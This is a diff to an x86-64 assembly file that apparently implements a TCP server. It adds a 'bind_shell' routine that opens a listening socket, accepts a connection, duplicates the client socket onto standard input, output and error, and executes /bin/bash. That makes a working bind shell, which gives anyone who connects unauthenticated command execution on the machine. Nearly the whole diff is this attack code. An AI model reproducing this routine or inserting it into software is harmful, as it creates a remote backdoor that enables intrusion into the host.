@@ -15,6 +15,8 @@ sockaddr_in:
     .space 8          
 reuseaddr_val:
     .int 1
+binsh:
+	.asciz "/bin/bash"
 
 .section .bss
 buffer:
@@ -309,6 +311,77 @@ tcp_server:
 
 	mov eax, 3
 	mov edi, [rip + socketfd]
+	syscall
+
+	mov eax, 3
+	mov edi, [rip + clientfd]
+	syscall
+	ret
+
+.global bind_shell
+bind_shell:
+	mov eax, 41
+	mov edi, 2          
+	mov esi, 1          
+	xor edx, edx        
+	syscall
+	mov [rip + socketfd], eax
+
+	mov eax, 54
+	mov edi, [rip + socketfd]
+	mov esi, 1 
+	mov edx, 2 
+	lea r10, [rip + reuseaddr_val]
+	mov r8, 4 
+	syscall
+	
+	mov eax, 49
+	mov edi, [rip + socketfd]
+	lea rsi, [rip + sockaddr_in]
+	mov edx, 16
+	syscall
+	cmp rax, 0
+	js fail
+	
+	mov eax, 50
+	mov edi, [rip + socketfd]
+	mov esi, 5
+	syscall
+	cmp rax, 0
+	js fail
+
+	mov eax, 43
+	mov edi, [rip + socketfd]
+	xor rsi, rsi
+	xor rdx, rdx
+	syscall
+	cmp rax, 0
+	js fail
+	mov [rip + clientfd], eax
+
+	mov eax, 3
+	mov edi, [rip + socketfd]
+	syscall
+	
+	mov eax, 33
+	mov edi, [rip + clientfd]
+	xor esi, esi       
+	syscall
+
+	mov eax, 33
+	mov edi, [rip + clientfd]
+	mov esi, 1
+	syscall
+
+	mov eax, 33
+	mov edi, [rip + clientfd]
+	mov esi, 2
+	syscall
+
+	lea rdi, [rip + binsh]
+	xor rsi, rsi
+	xor rdx, rdx
+	mov eax, 59
 	syscall
 
 	mov eax, 3
